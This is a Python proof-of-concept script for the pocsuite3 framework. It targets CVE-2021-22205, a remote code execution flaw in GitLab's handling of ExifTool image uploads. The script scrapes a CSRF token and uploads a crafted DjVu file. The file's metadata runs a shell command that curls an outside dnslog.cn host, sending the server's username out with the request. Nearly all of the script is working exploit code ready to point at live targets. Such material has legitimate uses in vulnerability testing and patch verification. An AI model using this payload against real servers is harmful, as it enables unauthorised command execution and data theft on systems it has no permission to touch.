#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, VUL_TYPE, POC_CATEGORY, OptString
from bs4 import BeautifulSoup


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1.0'  # 默认为1
    author = 'Wing'  # PoC作者的大名
    vulDate = '2021-4-14'  # 漏洞公开的时间,不知道就写今天
    createDate = '2021-11-16'  # 编写 PoC 的日期
    updateDate = '2021-11-16'  # PoC 更新的时间,默认和编写时间一样
    # 漏洞地址来源,0day不用写
    references = ['https://github.com/RedTeamWing/CVE-2021-22205',]
    name = 'CVE-2021-22205 Gitlab Upload RCE '  # PoC 名称
    appPowerLink = 'https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/'  # 漏洞厂商主页地址
    appName = 'Gitlab'  # 漏洞应用名称
    appVersion = '11.9<=Gitlab CE/EE<13.8.8,13.9<=Gitlab CE/EE<13.9.6,13.10<=Gitlab CE/EE<13.10.3'  # 漏洞影响版本
    vulType = VUL_TYPE.REMOTE_FILE_INCLUSION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = ''' 
        由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。
        GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。 '''  # 漏洞简要描述
    samples = []

    def _verify(self):
        result = {}
        session = requests.Session()
        try:
            r = session.get(self.url.rstrip("/") + "/users/sign_in")
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.q3ddlk.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36", "Connection": "close",
                       "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5", "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
            flag = 'Failed to process image'
            req = session.post(self.url.rstrip( "/") + "/uploads/user", data=data, headers=headers)
            if flag in req.text:
                result['VerfiryInfo'] = {}
                result['VerfiryInfo']['URL'] = self.url
                result['VerfiryInfo']['Postdata'] = data
        except Exception as e:
            pass
            #print(e)

        return self.parse_output(result)

    def _options(self):
        o = OrderedDict()
        o['command'] = OptString('whoami', '输入需要执行的命令', require=False)
        return o

    def _attack(self):
        self._verify()

    def _shell(self):
        pass

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)
